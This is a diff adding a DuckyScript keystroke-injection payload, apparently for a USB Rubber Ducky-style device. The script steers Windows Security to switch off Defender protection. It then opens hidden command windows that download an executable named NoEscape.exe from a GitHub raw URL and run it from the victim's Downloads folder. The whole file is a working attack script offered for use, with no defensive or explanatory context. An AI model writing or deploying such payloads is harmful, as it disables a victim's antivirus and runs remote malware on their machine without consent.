@@ -1,0 +1,25 @@
+REM Disable Windows Defender
+DELAY 1000
+GUI
+DELAY 500
+STRING virus & threat protection
+ENTER
+DELAY 3000
+TAB
+REPEAT 3
+DELAY 200
+ENTER
+DELAY 200
+SPACE
+DELAY 3000
+ALT y
+REM Download NoEscape.exe
+DELAY 1000
+GUI r
+DELAY 300
+STRING cmd.exe -w hidden -c "start chrome -w hidden https://raw.githubusercontent.com/WinparWinpar/duckyscripts/main/NoEscape.exe"
+REM Run NoEscape.exe
+DELAY 1000
+GUI r
+DELAY 300
+STRING cmd.exe -w hidden -c "cd %USERPROFILE%\Downloads && .\NoEscape.exe && exit"
